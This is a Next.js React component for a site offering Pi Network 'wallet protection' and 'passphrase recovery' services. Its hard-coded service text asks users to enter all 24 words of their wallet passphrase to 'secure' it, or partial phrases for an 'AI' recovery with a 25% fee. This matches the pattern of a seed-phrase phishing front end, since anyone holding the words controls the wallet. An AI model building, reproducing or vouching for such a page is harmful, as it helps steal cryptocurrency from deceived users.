"use client"

import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Shield, Key, CheckCircle, ArrowRight, Loader } from "lucide-react"
import Link from "next/link"
import { useAppDispatch, useAppSelector } from "@/redux/hooks"
import { useEffect, useState } from "react"
import { fetchServices } from "@/redux/slices/service"
import { useRouter } from "next/navigation"
import { authenticateUser, initializePiSDK } from "@/redux/slices/auth"

const services = [
    {
      "_id": "67d54c4fbed51b89043628f7",
      "name": "Recover Pi Unlock",
      "type": "protection",
      "description": "Secure your wallet if you believe your passphrase is at risk. Enter all 24 words of your passphrase to secure your wallet and prevent unauthorized access.",
      "usageInstructions": "Enter all 24 words of your passphrase to secure your wallet and prevent unauthorized access.",
      "buttonText": "Select Wallet Protection",
      "createdAt": "2025-03-15T09:45:51.570Z",
      "updatedAt": "2025-03-16T11:07:24.889Z",
      "__v": 0,
      "whenToUse": "Use this if you still have your complete passphrase but believe it may be compromised.",
      "howItWorks": [
        "Enter all 24 words of your passphrase",
        "Our system secures your wallet immediately",
        "Prevents unauthorized access to your Pi balance",
        "Receive confirmation once protection is active"
      ],
      "subtitle": "Secure your Pi on unlock when you believe your passphrase is leaked to scammers website"
    },
    {
      "_id": "67d54ca113d5101c76bb246e",
      "name": "Passphrase Recovery",
      "type": "recovery",
      "description": "Recover your complete passphrase when you’re missing words. Enter the 21-23 words you remember, and our AI system will help identify the missing word(s).",
      "usageInstructions": "Enter the 21-23 words you remember, and our AI system will help identify the missing word(s).",
      "buttonText": "Select Passphrase Recovery",
      "createdAt": "2025-03-15T09:47:13.114Z",
      "updatedAt": "2025-03-15T10:24:50.734Z",
      "__v": 0,
      "whenToUse": "Use this if you’re missing 1-3 words from your 24-word passphrase.",
      "howItWorks": [
        "Enter the 21-23 words you remember",
        "Our AI system identifies the missing word(s)",
        "Recover your complete 24-word passphrase",
        "25% fee only if recovery is successful"
      ],
      "subtitle": "Recover your complete passphrase when you're missing words"
    }
  ]

export default function HowItWorks() {
//   const { services } = useAppSelector((state) => state.services)
  const {currentUser} = useAppSelector(state => state.auth)
  const [isLoading,setIsLoading] = useState(false)

  const router = useRouter()

  const dispatch = useAppDispatch()

  useEffect(() => {
    dispatch(fetchServices())
  }, [dispatch])

  const handlePiAuth = async () => {
    setIsLoading(true)
    try {
      await dispatch(initializePiSDK()).unwrap();
      const result = await dispatch(authenticateUser()).unwrap();
    } catch (error) {
      console.error("Authentication failed:", error);
    } finally {
      setIsLoading(false);
    }
  }

  return (
    <section id="how-it-works" className="py-12 sm:py-20 bg-muted/50">
      <div className="container px-1 sm:px-6">
        <div className="text-center mb-8 sm:mb-16">
          <h2 className="text-2xl sm:text-3xl md:text-4xl font-bold mb-2 sm:mb-4">Our Services</h2>
          <p className="text-base sm:text-xl text-muted-foreground max-w-2xl mx-auto">
            We offer two powerful solutions to keep your Pi Network wallet secure
          </p>
        </div>

        <div className="grid grid-cols-2 sm:grid-cols-2 gap-1 sm:gap-6 md:gap-8">
          {services.map((service) => (
            <Card key={service._id} className="card-hover h-full flex flex-col">
              <CardHeader className="pb-2 sm:pb-4">
               <div className="flex items-center gap-2">
               {service.type === "protection" ? (
                  <Shield className="h-5 w-5 sm:h-12 sm:w-12 text-primary mb-2 sm:mb-4" />
                ) : (
                  <Key className="h-5 w-5 sm:h-12 sm:w-12 text-primary mb-2 sm:mb-4" />
                )}
                <CardTitle className="text-md sm:text-2xl">{service.name}</CardTitle>
               </div>
                <CardDescription className="text-sm sm:text-base">{service.subtitle}</CardDescription>
              </CardHeader>
              <CardContent className="flex-grow pb-2 sm:pb-4">
                <ul className="space-y-2 sm:space-y-4 text-sm sm:text-base">
                  {service.howItWorks.map((item, i) => (
                    <li key={i} className="flex items-start">
                      <CheckCircle className="h-4 w-4 sm:h-5 sm:w-5 text-primary shrink-0 mr-1.5 sm:mr-2 mt-0.5" />
                      <span className="text-xs">{item}</span>
                    </li>
                  ))}
                </ul>
              </CardContent>
              <CardFooter>
                {
                    currentUser ? <Button asChild className="w-full text-sm sm:text-base py-1.5 sm:py-2">
                    <Link href={`/recovery/${service.type}`}>
                      GO
                      <ArrowRight className="ml-1 sm:ml-2 h-3 w-3 sm:h-4 sm:w-4" />
                    </Link>
                  </Button> : <Button onClick={currentUser ? () => router.push("/services") : handlePiAuth} asChild className="w-full text-sm sm:text-base py-1.5 sm:py-2">
                  <Link href="#">
                    Go
                    <ArrowRight className="ml-1 sm:ml-2 h-3 w-3 sm:h-4 sm:w-4" />
                  </Link>
                </Button> 
                }
              </CardFooter>
            </Card>
          ))}
        </div>
      </div>
    </section>
  )
}

